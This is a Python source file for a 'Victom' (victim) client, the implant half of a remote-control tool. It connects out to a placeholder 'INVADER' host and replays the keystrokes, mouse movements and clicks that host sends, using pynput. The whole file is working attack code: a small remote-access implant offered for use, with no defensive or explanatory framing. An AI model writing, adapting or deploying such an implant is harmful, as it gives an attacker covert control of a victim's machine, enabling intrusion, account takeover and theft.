"""Victom client: receive control packets and replay input remotely."""

import socket
from pynput import mouse, keyboard
from pynput.keyboard import Controller as ControllerKeyboard
from pynput.mouse import Controller as Controller_mouse
import time


class Victom:
    def __init__(self):

        self.Control_kb = ControllerKeyboard()
        self.Control_m = Controller_mouse()
        self.Client: socket.socket = None

        HOST = "IP-ADDRESS-INVADER"
        PORT = "PORT-INVADER"

        self.Control_m.position = (0, 0)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.Client:
            self.Client.connect((HOST, PORT))

            while True:
                try:
                    # Read the length-prefixed mode identifier and then the payload.
                    Mod_size = int.from_bytes(self.recv_exact(2), "big")
                    Mod = self.recv_exact(Mod_size).decode()
                    data_size = int.from_bytes(self.recv_exact(2), "big")
                    Control = self.recv_exact(data_size).decode()
                except ConnectionError:
                    break

                if Mod == "kb":
                    if Control.startswith("Key."):
                        key_name = Control[4:]
                        key = getattr(keyboard.Key, key_name)
                    else:
                        key = Control

                    self.Control_kb.press(key)
                    time.sleep(0.03)
                    self.Control_kb.release(key)
                elif Mod == "pos":
                    x, y = Control.split("|")
                    self.Control_m.position = (int(x), int(y))
                elif Mod == "click":
                    Button_name = Control[7:]
                    Button = getattr(mouse.Button, Button_name)
                    self.Control_m.click(Button)

                

    def recv_exact(self, size):
        """Receive exactly the requested number of bytes from the socket.

        TCP can return smaller chunks, so this helper loops until the full
        header or payload has been received.
        """
        data_record = b""

        while len(data_record) < size:
            data = self.Client.recv(size - len(data_record))

            if not data:
                raise ConnectionError("Connection closed before receiving all data")

            data_record += data

        return data_record


if __name__ == "__main__":
    V = Victom()